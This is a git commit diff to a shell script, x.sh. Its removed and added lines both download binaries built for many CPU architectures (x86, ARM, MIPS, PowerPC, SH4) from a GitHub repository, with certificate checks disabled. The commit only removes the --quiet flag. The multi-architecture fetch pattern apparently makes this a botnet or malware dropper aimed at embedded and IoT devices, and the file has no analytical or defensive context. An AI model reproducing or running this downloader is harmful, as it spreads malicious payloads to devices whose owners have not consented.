2cc48e7eac1e89eb1ba7d529a4b0c1fa5184c6be
nbz-hk <nbz-hk@users.noreply.github.com>
2017-01-17 20:17:09 -0500

    Update x.sh

--- x.sh
+++ x.sh
@@ -1,8 +1,8 @@
-wget --quiet --no-check-certificate -O k-32 https://github.com/nbz-hk/nbz/blob/master/k-32?raw=true
-wget --quiet --no-check-certificate -O k-64 https://github.com/nbz-hk/nbz/blob/master/k-64?raw=true
-wget --quiet --no-check-certificate -O k-armv6 https://github.com/nbz-hk/nbz/blob/master/k-armv6?raw=true
-wget --quiet --no-check-certificate -O k-i586 https://github.com/nbz-hk/nbz/blob/master/k-i586?raw=true
-wget --quiet --no-check-certificate -O k-mips https://github.com/nbz-hk/nbz/blob/master/k-mips?raw=true
-wget --quiet --no-check-certificate -O k-mipsel https://github.com/nbz-hk/nbz/blob/master/k-mipsel?raw=true
-wget --quiet --no-check-certificate -O k-powerpc https://github.com/nbz-hk/nbz/blob/master/k-powerpc?raw=true
-wget --quiet --no-check-certificate -O k-sh4 https://github.com/nbz-hk/nbz/blob/master/k-sh4?raw=true
+wget --no-check-certificate -O k-32 https://github.com/nbz-hk/nbz/blob/master/k-32?raw=true
+wget --no-check-certificate -O k-64 https://github.com/nbz-hk/nbz/blob/master/k-64?raw=true
+wget --no-check-certificate -O k-armv6 https://github.com/nbz-hk/nbz/blob/master/k-armv6?raw=true
+wget --no-check-certificate -O k-i586 https://github.com/nbz-hk/nbz/blob/master/k-i586?raw=true
+wget --no-check-certificate -O k-mips https://github.com/nbz-hk/nbz/blob/master/k-mips?raw=true
+wget --no-check-certificate -O k-mipsel https://github.com/nbz-hk/nbz/blob/master/k-mipsel?raw=true
+wget --no-check-certificate -O k-powerpc https://github.com/nbz-hk/nbz/blob/master/k-powerpc?raw=true
+wget --no-check-certificate -O k-sh4 https://github.com/nbz-hk/nbz/blob/master/k-sh4?raw=true
